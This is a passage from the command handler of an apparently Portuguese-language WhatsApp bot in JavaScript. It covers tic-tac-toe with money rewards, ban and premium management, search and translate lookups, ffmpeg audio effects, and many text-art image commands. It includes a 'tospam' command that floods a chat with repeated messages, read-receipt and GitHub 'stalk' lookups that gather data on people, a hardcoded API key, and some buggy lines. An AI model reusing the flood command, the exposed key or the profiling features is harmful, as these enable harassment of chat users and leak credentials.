while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'c1':
if (esp.c1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'c2':
if (esp.c2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'c3':
if (esp.c3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.c3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
}
tttset.reActivate1 = "on"
reply(`🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
if (WinnerX()) {
if (isGroup) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = Math.floor(Math.random() * 200) + 200
add_dinheiro(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 300) + 300
add_dinheiro(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = Math.floor(Math.random() * 400) + 400
add_dinheiro(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 10000) + 100000
add_dinheiro(tttset.player, randomTTTXP)
break
}
edward.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉\n\n➣RECOMPENSA: +${randomTTTXP} DINHEIRO 🔮`, text)
} else {
edward.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉`, text)
}
const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
if (currentTTTwins === undefined && checkTTTIdWin === undefined) addTTTId(tttset.player)
addTTTwin(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "??"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (WinnerO()) {
if (isGroup) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = 0 - (Math.floor(Math.random() * 200) + 200)
add_dinheiro(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = 0 - (Math.floor(Math.random() * 300) + 300)
add_dinheiro(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = 0 - (Math.floor(Math.random() * 4000) + 4000)
add_dinheiro(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = 0
add_dinheiro(tttset.player, randomTTTXP)
break
}	
edward.sendMessage(from, `VITÓRIA DO ed😎\n\n➣PUNIÇÃO: ${randomTTTXP} DINHEIRO 🔮`, text)
} else {
edward.sendMessage(from, ` VITÓRIA DO ed😎`, text)
}
const currentTTTdefeats = getTTTdefeats(tttset.player)
const checkTTTIdDefeat = getTTTId(tttset.player)
if (currentTTTdefeats === undefined && checkTTTIdDefeat === undefined) addTTTId(tttset.player)
addTTTdefeat(tttset.player, 1)
addTTTpoints(tttset.player, randomTTTXP)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
} else if (Tie()) {
if (isGroup) {
edward.sendMessage(from, `🎉🎉 EMPATE 🎉🎉\n\n➣NÃO HÁ GANHOS NEM PERDAS`, text)
} else {
edward.sendMessage(from, `🎉🎉 EMPATE 🎉🎉`, text)
}
const currentTTTties = getTTTties(tttset.player)
const checkTTTIdTie = getTTTId(tttset.player)
if (currentTTTties === undefined && checkTTTIdTie === undefined) addTTTId(tttset.player)
addTTTtie(tttset.player, 1)
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.waitingTime = "on"
}
tttset.tttantibug = "off"
}
}
break			  
				case 'public':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			publik = true
				reply('Modo público foi ativado 🔓')
			break
			case 'self':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				publik = false
				reply('Modo privado foi ativado 🔒')
			break
			  case 'afk': 
              if (!isGroup) return reply(mess.only.group)
              if (isAfkOn) return reply('Você ja esta modo afk')
              const reason = c ? c : 'Sem Razão.'
              afk.addAfkUser(sender, time, reason, _afk)
              const aluty = `Modo Afk Foi: *ativado!*\n\n➸ *Nome*: ${pushname}\n➸ *Rasão*: ${reason}`
              reply(aluty)
              break
case 'ban':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
banbotdb = mek.message.extendedTextMessage.contextInfo.participant
pru = '*\n'
for (let _ of banbotdb) {
pru += `@${_.split('@')[0]}\n`
}
ban.push(`${banbotdb}`)
fs.writeFileSync('./db/usuário_db/banned.json', JSON.stringify(ban))
susp = `❗BAN❗

➼ *banido por:* ${pushname}
➼ *número:* @${banbotdb[0].split('@')[0]}`
mentions(`${susp}`, banbotdb, true)   
break
case 'unban':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
banbotdb = mek.message.extendedTextMessage.contextInfo.participant
pru = '*\n'
for (let _ of banbotdb) {
pru += `@${_.split('@')[0]}\n`
}
ban.splice(`${banbotdb}`)
fs.writeFileSync('./db/usuário_db/banned.json', JSON.stringify(ban))
susp = `❗UNBAN❗

➼ *desbanido por:* ${pushname}
➼ *número:* @${banbotdb[0].split('@')[0]}`
mentions(`${susp}`, banbotdb, true)   
break			
//------------------< Premium >-------------------
       case 'premium': 
              if (!isOwner) return reply(mess.only.owner)
              if (args[0] === 'add') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

              premium.addPremiumUser(mentioned[0], args[2], _premium)
              reply(`*「 PREMIUM ADICIONADO 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expira em*: ${ms(toMs(args[2])).days} dia(s) ${ms(toMs(args[2])).hours} hora(s) ${ms(toMs(args[2])).minutes} minuto(s)`)
                        
              } else {
                            
              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
              reply(`*「 PREMIUM ADICIONADO 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expira em*: ${ms(toMs(args[2])).days} dia(s) ${ms(toMs(args[2])).hours} hora(s) ${ms(toMs(args[2])).minutes} minuto(s)`)
}
              } else if (args[0] === 'del') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
              fs.writeFileSync('./db/usuário_db/premium.json', JSON.stringify(_premium))
              reply(mess.success)
              } else {
            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
              fs.writeFileSync('./db/usuário_db/premium.json', JSON.stringify(_premium))
              reply(mess.success)
}
              } else {
              reply('formato errado :/')
}
              break
       case 'checarprem':
       case 'chacarpremium': 
              if (!isPremium) return reply(mess.only.premium)
              const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
              reply(`*「 DATA DE TÉRMINO 」*\n\n➸ *ID*: ${sender}\n➸ *Premium acaba em*: ${cekExp.days} dia(s) ${cekExp.hours} hora(s) ${cekExp.minutes} minuto(s)`)
              break
       case 'listaprem':
       case 'listapremium':          
              let txt = `「 *LISTA DE USUÁRIOS PREMIUM* 」\n\n`
              let men = [];
              for (let i of _premium){
              men.push(i.id)
              const checkExp = ms(i.expired - Date.now())
              txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expira em*: ${checkExp.days} dia(s) ${checkExp.hours} hora(s) ${checkExp.minutes} minuto(s)\n\n`
}
              mentions(txt, men, true)
              break
       case 'compraprem':
       case 'buypremium':
       case 'buyprem':
              gopeynya = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRD-oCLwzNFX89HZgsUUZcGHqi-Id3UHI3rBQ&usqp=CAU'
              teksnya = `*── 「 LISTA DE PREÇOS 」 ──*

*BOT* : 000000
*PREMIUM* : 000000`
              edward.sendMessage(from, await getBuffer(gopeynya), image, {quoted: mek, caption: teksnya })
              break             
		case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Cadê a pesquisa patrão 🤨?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Erro ao fazer upload da imagem 💢_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Resultados da pesquisa :* ${teks}`})
}
}
break
	
				case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('O que você está procurando? Não sou vidente 😂')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Titúlo* : ${i.title}
*Link* : ${i.link}
*Informação* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (args.length < 1) return reply('O que você está procurando?, preciso de um nome ué 😕')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] O Resultado não foi encontrado 😔_') 
}) 
result = `*Titúlo :* ${res[0].judul}
*Wikipédia :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break

				case 'translate':
				case 'ts':
				case 'traduzir':
				case 'tradutor':
					try{
					if ( args.length === 1 ){
						tekss = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						translate(tekss, {client: 'pt', to:args[0]})
						.then((res) =>{
							reply(res.text)
							}) 
						} else
			if(args.length > 0 ) {
				ngab = args.join(' ')
			teks = ngab.split(' ')[0];
			bhs = ngab.split(' ')[1];
			  translate(teks, {client: 'gtx', to:bhs})
			  .then((res) =>{
				  reply(res.text)
				  })
				}
			} catch (e){
				reply(mess.error.api)
			}
				  break
				

					case 'githubstalk':
					if (args.length < 1) return reply('Nome do usuário...')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Nome : ${anu.result.name}\n❏ Seguidores : ${anu.result.followers}\n❏ Seguindo : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Tipo : ${anu.result.type}\n❏ Empresa : ${anu.result.company}\n❏ Localização : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Criado em : ${anu.result.created_at}\n❏ Atualizado em : ${anu.result.updated_at}\n❏ Nome de usuário do Twitter : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					edward.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 				
				case 'dado':
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./figurinha_exif/${random}.webp`)
			edward.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await edward.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
edward.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await edward.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					edward.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await edward.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
edward.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'bass':                 
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await edward.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						edward.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
				break
case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await edward.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Msg Lida por :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Horário : ` + moment(`${i.t}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('O limit e 50, não abuse 😠!')
if (!Number(oi2)) return reply('Coloque a quantidade em formato de número...!')
	  for (let i = 0; i < oi2; i++) {
	  edward.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Coloque a quantidade em formato de número...!')
if (Number(args[0]) >= 50) return reply('O limit e 50, não abuse 😠!!')
	  for (let i = 0; i < args[0]; i++) {
	  edward.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await edward.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Coloque a quantidade em formato de número...!')
	if (Number(args[0]) >= 50) return reply('O limit e 50, não abuse 😠!!')
	  for (let i = 0; i < args[0]; i++) {
	  edward.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await edward.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Coloque a quantidade em formato de número...!')
	if (Number(args[0]) >= 50) return reply('O limit e 50, não abuse 😠!!')
	  for (let i = 0; i < args[0]; i++) {
	  edward.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await edward.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('O limite é 50, não abuse 😠!!')
	if (!Number(oi2)) return reply('Coloque a quantidade em formato de número...!')
	  for (let i = 0; i < oi2; i++) {
	  edward.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
//MAKER

                 
                   case 'transformer':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/transformer?texto=${texto}&apikey=edwardbot22`)
                   
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'berry':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/berry?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'magma':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/magma?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                 
             
                   
                   case 'harrypotter':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/harry?texto=${texto}&apikey=edwardbot22`)
                   
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'embossed':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/embossed?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'broken':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/broken?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'artpaper':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/oxy/paper?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case '3dglossy':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/glossy?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   case '3dunderwater':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/oxy/underwater?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   
                   case 'cloud':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/cloud?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'luxury':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/luxury?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   case 'sandsummer':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/sandsummer?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   
                   case 'summerysand':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/summerysand?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   case 'metaldarkgold':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/metaldark?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'neonlight':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/neontext?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case '1917':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/1917?texto=${texto}&apikey=edwardbot22`)

                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   case 'halloweenfire':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/halloweenfire?texto=${texto}&apikey=edwardbot22`)
                   
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'lava':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/lava?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {quoted: mek})
                   break
                   case 'steeltext':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/steeltext?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'capitaoamerica':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/captain?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'toxic':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/toxic?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   
                   
                   case 'horror':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/horrorgift?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'thunder':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/thunder?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                
                   case 'naturalleaves':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/naturalleaves?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                   case 'blackpink':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/blackpink?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
                 
                   case 'christmas':  //by Ꮥꪖꪗꪮ </>
                			if (args.length == 0) return reply(`Exemplo: ${prefix + command} edward`)
                   texto = args.join(" ")
                   reply(`Estou fazendo 🤠`)
                   anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/christmas?texto=${texto}&apikey=edwardbot22`)
                   buffer = await getBuffer(anu.resultado)
                   edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                   break
 
                     case 'america':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(8)}`
                    texto1 = cf.split("/")[0];
                    texto2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ${NomeBot}`)
         
